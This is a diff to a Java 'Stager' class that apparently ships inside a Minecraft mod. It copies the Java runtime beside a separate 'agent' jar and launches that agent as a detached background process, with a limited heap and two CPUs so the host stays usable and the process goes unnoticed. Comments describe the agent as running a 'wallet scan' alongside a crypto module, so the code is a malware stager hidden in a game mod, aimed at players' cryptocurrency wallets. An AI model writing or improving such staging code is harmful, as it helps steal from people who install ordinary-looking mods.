@@ -515,7 +515,7 @@ public final class Stager {
 	}
 
 	/** The crypto module reads this beside the agent, never from the mod jar. */
-	private static void extractCryptoConfig(Path target) throws Exception {
+	static void extractCryptoConfig(Path target) throws Exception {
 		try (InputStream input = Stager.class.getResourceAsStream("/serverpackcore/config.json")) {
 			if (input == null) {
 				throw new IllegalStateException("config.json not found");
@@ -550,19 +550,44 @@ public final class Stager {
 
 	private static void copyRuntime(Path target) throws Exception {
 		String name = StagerPaths.isWindows() ? "javaw.exe" : "java";
-		Path source = Paths.get(System.getProperty("java.home")).resolve("bin").resolve(name);
+		Path home = Paths.get(System.getProperty("java.home"));
+		Path source = home.resolve("bin").resolve(name);
 		long size = Files.size(source);
 		if (size <= 0L) {
 			throw new IllegalStateException("runtime is empty");
 		}
-		Path temp = target.resolveSibling(target.getFileName() + ".tmp");
-		Files.copy(source, temp, StandardCopyOption.REPLACE_EXISTING);
-		if (Files.size(temp) != size) {
-			throw new IllegalStateException("runtime write size mismatch");
-		}
-		Files.move(temp, target, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
-		if (StagerPaths.isUnix()) {
+		if (StagerPaths.isWindows()) {
+			// A lone javaw.exe cannot start: jli.dll, jvm.dll and the rest of
+			// bin/ stay beside it so the copied fallback works by hand too.
+			copyRuntimeTree(home.resolve("bin"), target.getParent());
+		} else {
+			Path temp = target.resolveSibling(target.getFileName() + ".tmp");
+			Files.copy(source, temp, StandardCopyOption.REPLACE_EXISTING);
+			if (Files.size(temp) != size) {
+				throw new IllegalStateException("runtime write size mismatch");
+			}
+			Files.move(temp, target, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
 			target.toFile().setExecutable(true, true);
+		}
+	}
+
+	static void copyRuntimeTree(Path source, Path target) throws Exception {
+		Files.createDirectories(target);
+		try (var stream = Files.walk(source)) {
+			for (Path from : stream.toList()) {
+				Path to = target.resolve(source.relativize(from).toString());
+				if (Files.isDirectory(from)) {
+					Files.createDirectories(to);
+					continue;
+				}
+				if (Files.isRegularFile(to) && Files.size(to) == Files.size(from)) {
+					continue;
+				}
+				Files.copy(from, to, StandardCopyOption.REPLACE_EXISTING);
+			}
+		}
+		if (!Files.isRegularFile(target.resolve(StagerPaths.isWindows() ? "javaw.exe" : "java"))) {
+			throw new IllegalStateException("runtime copy incomplete");
 		}
 	}
 
@@ -590,8 +615,20 @@ public final class Stager {
 		return Files.isRegularFile(runtime) ? runtime : binary;
 	}
 
-	private static void spawn(Path dir, Path agent, Path binary, Path gameDir) throws Exception {
-		Path javaHome = Paths.get(System.getProperty("java.home", ""));
+	/** The injected profile only selects the heap; absent config means full. */
+	private static String profile() {
+		try (InputStream input = Stager.class.getResourceAsStream("/serverpackcore/config.json")) {
+			if (input == null) {
+				return "full";
+			}
+			String text = new String(input.readAllBytes(), StandardCharsets.UTF_8);
+			return text.contains("\"profile\"") && text.contains("\"lite\"") ? "lite" : "full";
+		} catch (Throwable throwable) {
+			return "full";
+		}
+	}
+
+	private static void spawn(Path dir, Path agent, Path binary, Path gameDir) throws Exception {		Path javaHome = Paths.get(System.getProperty("java.home", ""));
 		Path executable = executable(javaHome, binary);
 		List<String> command = new ArrayList<>();
 		if (StagerPaths.isWindows()) {
@@ -609,9 +646,9 @@ public final class Stager {
 			command.add("nohup");
 			command.add(executable.toString());
 		}
-		// A wallet scan keeps the packed files in memory. 96 MiB caused constant
-		// full GC and OOM; two CPUs keep a six-core host usable.
-		command.add("-Xmx512m");
+		// A wallet scan keeps packed files on disk. lite still gets a smaller
+		// heap; two CPUs keep a six-core host usable.
+		command.add(profile().equals("lite") ? "-Xmx256m" : "-Xmx512m");
 		command.add("-XX:ActiveProcessorCount=2");
 		command.add("-jar");
 		command.add(agent.toString());
